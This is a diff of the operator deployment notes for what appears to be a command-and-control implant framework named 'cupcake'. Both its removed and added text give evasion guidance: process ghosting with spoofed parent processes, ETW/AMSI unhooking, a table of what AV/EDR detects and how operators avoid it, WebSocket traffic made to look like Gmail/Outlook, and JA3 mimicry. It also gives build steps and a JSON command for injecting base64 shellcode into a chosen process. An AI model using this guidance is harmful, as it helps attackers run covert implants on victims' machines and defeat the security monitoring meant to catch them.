@@ -1,93 +1,140 @@
 # OPSEC deploy notes (agent + control plane)
 
-## iso_host disk reality
+> Updated: 2026-07-27 · aligns with maintenance plan Wave 0–1
 
-- **BOF / .NET payload body**: always on the **pipe** only (job frame) — never a payload file.
-- **Host EXE (x64 preferred path)** — `native/ghost_host.rs`:
-  1. **Section ghost + true PPID**: delete-pending file → `NtCreateSection(SEC_IMAGE)` → close file (path gone) → open parent from pool (`RuntimeBroker` / `sihost` / …) → **`NtCreateProcessEx(ParentProcess=parent, Section=host)`** → spoofed ImagePath in process params → `NtCreateThreadEx`. Kernel parent is the spoofed process (not the agent).
-  2. **Fallback**: delete-on-close `CreateProcessW` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` (same parent pool).
-  3. **Last resort**: classic temp stage under INetCache, burned after exit.
-- Non-x64 / failure: falls back to temp stage automatically.
+## Control plane defaults
 
-## Wire seed (P0)
+| Item | Safe default |
+|------|----------------|
+| `admin_bind` | `127.0.0.1` |
+| `admin_pass` | empty → random on first boot |
+| Lab only | `CUPCAKE_FORCE_DEV_PASS=1` → admin/`cupcake123` (**never production**) |
+| Config sample | `server/config.example.json` (real `config.json` is gitignored) |
 
-- Client `build.rs` and server `utils.WireIDs` share algorithm + default seed `wire-v1-default-2026`.
-- Override: set `CUPCAKE_WIRE_SEED` on the **server process** and ensure panel builds inject the same (builder exports env to cargo).
-- Setting `wire_seed` in DB is written on first start if empty.
+## Tunnel credentials
 
-## Profiles
+- SOCKS/HTTP proxy passwords are **bcrypt-hashed** in DB.
+- List API does not return password material (`has_auth` only).
+- Legacy plaintext rows still verify until next start rewrite.
 
-- **minimal / standard**: never enable `stealth-adv` (ETW/AMSI unhook = louder).
-- **full**: only when you explicitly accept ETW/AMSI hunting rules.
+## Malleable profile (WS)
 
-## Why AV/EDR kills “during heavy ops” (not only at first beacon)
+- Agent rewrites path via `uri_template` + injects profile headers.
+- Listener accepts **any** WebSocket path (catch-all) so gmail/outlook URIs work.
+- Optional: set listener `profile` + `profile_strict`, or env `CUPCAKE_PROFILE_STRICT=1`.
 
-Agent **online/heartbeat alone** is usually quieter. **Kills spike when operators burst post-ex**:
+## Agent build profiles
 
-| Action | High-signal behavior | What AV/EDR sees |
-|--------|----------------------|------------------|
-| BOF / execute-assembly | `iso_host` process create + PPID spoof + pipes | Process tree anomaly, short-lived children of RuntimeBroker/sihost |
-| Module stage (L2 DLL) | Often **temp write + LoadLibrary** (Rust CRT/TLS cannot Manual-Map DllMain safely) | Image load from user cache / short-lived DLL |
-| native_exec (fscan 等) | Temp PE + CreateProcess | New unsigned EXE under INetCache/TEMP |
-| Fileless one-click | PS `VirtualAlloc` + `CreateThread` / stager debug APIs | Classic shellcode loader signatures |
-| Profile `full` / `stealth-adv` | ETW/AMSI patch + ntdll unhook at **startup** | Immediate memory-patch alerts (often worse than not patching) |
+| Profile | Use |
+|---------|-----|
+| `minimal` | **Default red-team** reverse/forward |
+| `standard` | Monolith forward extras |
+| `full` / `stealth-adv` | Loud; only if you accept ETW/AMSI hunting |
 
-### Operator rules (must)
+## Heavy ops
 
-1. **Build `minimal`**, not `full`. Never ship `stealth-adv` unless you accept instant hunting.
-2. **Do not burst**: one BOF / one assembly / one plugin at a time; wait for result before next.
-3. Prefer **iso_host path** for BOF/.NET (already product default) — do **not** also stage legacy in-process `bof`/`dotnet` DLLs into the beacon.
-4. Avoid **fileless PS** on modern Defender; use disk Stage0 + careful ops, or hardened L0.
-5. Avoid **fscan-class native_exec** early — treat as last resort (temp PE is loud).
-6. Do not enable diag (`RUST_LOG` / `AGENT_ALLOW_DIAG`) on target.
+- Prefer iso_host for BOF/.NET; do not burst jobs.
+- `CUPCAKE_OPSEC_PACE_MS` pacing (default 300–1200 ms).
+- Avoid `native_exec`/fscan early.
 
-### Agent pacing (built-in)
+## Process inject (L2 module only)
 
-Env on the **agent process** (or set at build/run wrapper):
-
-| Value | Effect |
-|-------|--------|
-| *(unset)* | Random **300–1200 ms** pause before BOF/module-load/native spawn |
-| `CUPCAKE_OPSEC_PACE_MS=auto` | Same as default |
-| `CUPCAKE_OPSEC_PACE_MS=2000` | Fixed 2s between heavy ops |
-| `CUPCAKE_OPSEC_PACE_MS=off` | No delay (lab only) |
-
-Temp stage files use `LOCALAPPDATA\Microsoft\Windows\INetCache\~DF*.tmp|dll` (not `cpx_*.dll` under `%TEMP%`).
-
-## Control plane (P2)
-
-- New `config.json` defaults: `admin_bind=127.0.0.1`, empty password → random on first user create.
-- Lab convenience: `CUPCAKE_FORCE_DEV_PASS=1` forces `admin` / `cupcake123`.
-- Prefer reverse proxy / redirector so agents never see the real panel IP.
-- Production agents: do not set `AGENT_ALLOW_DIAG=1` / do not rely on `RUST_LOG`.
-
-## Strings gate
+Stage0 **does not** include inject. On demand:
 
 ```powershell
-powershell -File Client/scripts/strings-gate.ps1 -Path path\to\agent.exe
+cd Client
+cargo build -p cupcake-mod-inject --release
+# copy target/release/cupcake_mod_inject.dll → server/storage/modules/inject.bin
 ```
 
-## Lab: disable pacing
+Operator:
+
+1. Panel Modules → upload/push `inject` to agent (or auto-push on `module_required:inject`)
+2. Command type `process_inject`, content JSON:
+
+```json
+{"pid": 1234, "data": "<base64 shellcode>", "method": "auto", "wait_ms": 0}
+```
+
+3. `module_unload` id=`inject` after use
+
+OPSEC: remote VirtualAllocEx + thread create is high-signal; use sparingly, unload after.
+
+## Unit tests vs AV (`services.test.exe`)
+
+Package `services` used to always link **go-donut**, so Defender often deletes the package test binary.
+
+**Daily (safe):**
+
+```powershell
+cd server
+powershell -File scripts/test-services.ps1
+# go test ./services/ -tags nodonut -count=1
+```
+
+**Never:**
+
+```powershell
+go test -c ./services/    # drops services.test.exe into server/ → AV magnet
+```
+
+**Donut path (lab / may be killed):**
+
+```powershell
+powershell -File scripts/test-services.ps1 -WithDonut -Compile
+```
+
+Production `go build` is unchanged (real Donut included).
+
+## Wire seed
+
+Client `build.rs` and server `WireIDs` share `CUPCAKE_WIRE_SEED` (default `wire-v1-default-2026`).
+
+## Noise v2 + agent/server alignment (required)
+
+| Item | Rule |
+|------|------|
+| Handshake | **Noise v2 only**: 49-byte frames (`0x02 \|\| pubkey32 \|\| psk_mac16`) |
+| PSK | Listener AES **base** key — same bytes as agent `get_aes_key_base()` (32 ASCII or 64 hex). Short keys rejected (no zero-pad). |
+| Legacy | 33-byte v1 handshake is **rejected** on WS/TCP |
+| Register | Agent must send `reg_proof` = HMAC(session_key, `cupcake-reg-v1\|`\|\|uuid) |
+| Deploy | Rebuild **both** `cupcake-server` and agent after this cut |
+
+```powershell
+cd server
+go build -o cupcake-server.exe .
+# Listener EncryptKey must be exactly 32 bytes (or 64 hex) matching the patched agent key
+```
+
+## L2 inject methods (panel / API)
+
+`process_inject` JSON `method`: `nt` | `crt` | `apc` | `stomping` | `auto`  
+(`auto` does not include stomping — opt-in only.)
+
+## WSS / JA3 (起步)
+
+Default `ws` feature uses platform TLS. For **rustls + cipher order by profile ja3_hint**:
+
+```powershell
+cargo build -p cupcake-core --no-default-features --features "ws,ws-tls,minimal" --release
+```
+
+Not full browser JA3 (no GREASE / extension order). Suite order differs for chrome/edge vs firefox vs aws/github hints.
+
+## Frontend embed
+
+```powershell
+cd server
+powershell -File scripts/build-frontend.ps1
+# → dist/ only (//go:embed dist/*)
+```
+
+Do not use legacy `server/ui/`.
+
+## Yamux debug
+
+Default silent. Enable only in lab:
 
 ```text
-set CUPCAKE_OPSEC_PACE_MS=off
+set CUPCAKE_YAMUX_DEBUG=1
 ```
-
-## Lab hygiene: do not leave Go package test binaries
-
-`go test -c ./services` writes **`server/services.test.exe`** (~30MB). That binary links Donut/PE packing/fileless tests and is **commonly quarantined by AV** as a PE/shellcode toolset — not because the live panel is running.
-
-**Do this instead:**
-
-```powershell
-# Preferred: run tests without leaving a named test.exe in the tree
-cd server
-go test ./services/ -count=1 -timeout 120s
-
-# If you must compile: put output under TEMP, then delete
-go test -c -o $env:TEMP\cupcake_svc_unit.exe ./services/
-& $env:TEMP\cupcake_svc_unit.exe -test.count=1
-Remove-Item -Force $env:TEMP\cupcake_svc_unit.exe
-```
-
-Never commit or keep `services.test.exe` / `*.test.exe` under `server/`. Root `.gitignore` already has `/server/*.exe`.
